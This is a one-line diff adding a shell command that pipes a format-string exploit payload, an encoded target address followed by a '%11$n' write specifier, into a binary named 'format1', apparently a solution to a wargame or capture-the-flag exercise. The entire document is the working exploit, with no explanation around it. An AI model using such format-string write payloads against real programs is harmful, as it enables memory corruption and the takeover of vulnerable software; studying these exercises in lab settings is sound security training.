@@ -1,0 +1,1 @@
+(python -c 'print "\x2c\xa0\x04\x08%11$n"'; cat) | ./format1
